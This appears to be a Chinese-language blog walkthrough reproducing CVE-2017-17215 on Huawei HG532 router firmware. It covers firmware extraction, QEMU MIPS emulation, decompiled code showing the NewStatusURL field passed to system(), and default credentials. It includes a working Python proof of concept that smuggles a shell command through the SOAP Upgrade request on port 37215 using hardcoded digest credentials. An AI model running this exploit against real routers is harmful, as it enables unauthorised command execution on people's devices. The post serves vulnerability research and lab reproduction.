---
layout: post
title:  CVE-2017-17215
date:   2024-06-23 00:08:01 +0300
image:  2024-06-23-woman.jpg
tags:   [IoT]
---

固件

HG532eV100R001C01B020_upgrade_packet.bin

```assembly
iot@attifyos ~/D/CVE-2017-17215> 
binwalk HG532eV100R001C01B020_upgrade_packet.bin -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
8616          0x21A8          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 97728 bytes
70016         0x11180         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2733760 bytes
970489        0xECEF9         Squashfs filesystem, big endian, lzma signature, version 3.0, size: 2636036 bytes, 193 inodes, blocksize: 65536 bytes, created: 2012-07-21 02:15:38
```

在`Squashfs filesystem`的描述中显示系统为`big endian`

启动刚下载的镜像

> sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet
>

登录系统，账户密码都是root

设置宿主机的网络

> sudo ip tuntap add dev tap0 mode tap
>
> sudo ip link set dev tap0 up
>
> ifconfig
>
> 
>
> \# 配置网络，创建网桥
>
> sudo apt-get install bridge-utils
>
> sudo brctl addbr Virbr0
>
> sudo ifconfig Virbr0 192.168.10.1/24 up

```assembly
tap0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:bb:1f:e6:19:f9  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

> \# 创建tap接口，添加到网桥
>
> sudo apt install uml-utilities
>
> sudo tunctl -t tap0
>
> sudo ifconfig tap0 192.168.10.11/24 up
>
> sudo brctl addif Virbr0 tap0

设置网络

> \# 进入虚拟机后，配置ip地址，测试与主机的连通性
>
> ifconfig eth0 192.168.10.2/24 up
>
> ping 192.168.10.1 -c 10

宿主机ping虚拟机

> ping 192.168.10.2 -c 4

网络配置完成，将配置网络命令，添加至启动脚本

```assembly
#etc/profile
```

> reboot

生效

### 挂载文件系统

打开一个终端进入固件文件系统目录

> scp -r ./squashfs-root root@192.168.1.129:/root/

进入路由器环境中

> mount -o bind /dev ./squashfs-root/dev/
>
> mount -t proc /proc/ ./squashfs-root/proc/
>
> \# ssh新连接一个终端
>
> chroot squashfs-root /bin/sh

#此时的虚拟机的路由IP已经发生了变化，ssh已经断开了，所以需要返回虚拟机的终端进行更改IP地址

> ifconfig eth0 192.168.10.2/24 up
>
> ifconfig br0 192.168.10.11/24 up

这时按理说应该可以访问到web页面，但是我这里并不行

### 抓包分析

> tcpdump -i tap0 -w result.cap

PoC

```assembly
import threading, sys, time, random, socket, re, os, struct, array, requests
from requests.auth import HTTPDigestAuth

ip = str(sys.argv[1], "r")
cmd = "mkdir test" # Your MIPS
rm = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"
 
class exploit(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
    def run(self):
        try:
            url = "http://" + self.ip + ":37215/ctrlt/DeviceUpgrade_1"
            requests.post(url, timeout=5, auth=HTTPDigestAuth('dslf-config', 'admin'), data=rm)
            print( "[SOAP] Attempting to infect " + self.ip)
        except Exception as e:
            print(e)

try:
    n = exploit(ip)
    n.start()
    time.sleep(0.03)
except:
    print('error')
```

### 漏洞分析

首先确定在哪个文件中

> grep -r ctrlt

拖入IDA7.7

```assembly
int __fastcall UpnpGetServiceByUrl(int a1, _DWORD *a2)
{
  int v4; // $s2
  int j; // $s0
  _DWORD *i; // $s1
  _DWORD *v7; // $v0
  char v9[64]; // [sp+20h] [-40h] BYREF

  if ( !a1 )
    return 0;
  if ( !strncmp(a1, "/ctrlt/", 7) )
  {
    v4 = a1 + 7;
    if ( a2 )
      *a2 = 0;
    goto LABEL_9;
  }
  if ( strncmp(a1, "/ctrlu/", 7) )
  {
    v4 = a1 + 5;
    if ( !strncmp(a1, "/evt/", 5) )
      goto LABEL_9;
    return 0;
  }
  v4 = a1 + 7;
  if ( a2 )
    *a2 = 1;
LABEL_9:
  j = 0;
  if ( v4 )
  {
    for ( i = *(_DWORD **)g_pstUpnpGvarHead; i; i = v7 )
    {
      for ( j = i[7]; j; j = *(_DWORD *)(j + 56) )
      {
        if ( *(_DWORD *)(j + 8) )
        {
          snprintf();
          if ( !strcmp(v9, v4) )
            return j;
        }
      }
      v7 = (_DWORD *)i[10];
      if ( !v7 )
      {
        do
        {
          v7 = (_DWORD *)i[9];
          if ( v7 )
            break;
          i = (_DWORD *)i[11];
          v7 = i;
        }
        while ( i );
      }
    }
    return 0;
  }
  return j;
}
```

搜索NewStatusURL字符串，查找交叉引用

可以发现反编译结果并不直观，换用ghidra

```assembly
int FUN_0040749c(int param_1)

{
  int iVar1;
  int local_418;
  int local_414;
  char acStack_410 [1028];
  
  iVar1 = ATP_XML_GetChildNodeByName(*(undefined4 *)(param_1 + 0x2c),"NewDownloadURL",0,&local_4 18);
  if (((iVar1 == 0) && (local_418 != 0)) &&
     (iVar1 = ATP_XML_GetChildNodeByName
                        (*(undefined4 *)(param_1 + 0x2c),"NewStatusURL",0,&local_414), iVar1 == 0 ))
  {
    if (local_414 != 0) {
      snprintf(acStack_410,0x400,"upg -g -U %s -t \'1 Firmware Upgrade Image\' -c upnp -r %s -d -b ",
               local_418,local_414);
      system(acStack_410);
    }
  }
  return iVar1;
}
```

### [firmware-analysis-plus](https://github.com/liyansong2018/firmware-analysis-plus)

换用了这个工具，可以访问web页面了

默认的账号密码是：admin/@Hua1234

参考链接：

[https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458477628&idx=1&sn=e49b07ecfb8c6dd04343fa35f028a0ab&chksm=b18e54b686f9dda002b25d59ca8231765a09d4558baf4e08388a5e8aec263197defa36cc6136&scene=27](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458477628&idx=1&sn=e49b07ecfb8c6dd04343fa35f028a0ab&chksm=b18e54b686f9dda002b25d59ca8231765a09d4558baf4e08388a5e8aec263197defa36cc6136&scene=27)

[https://cloud.tencent.com/developer/article/1883281](https://cloud.tencent.com/developer/article/1883281)

[https://blog.csdn.net/The54No1/article/details/129362750](https://blog.csdn.net/The54No1/article/details/129362750)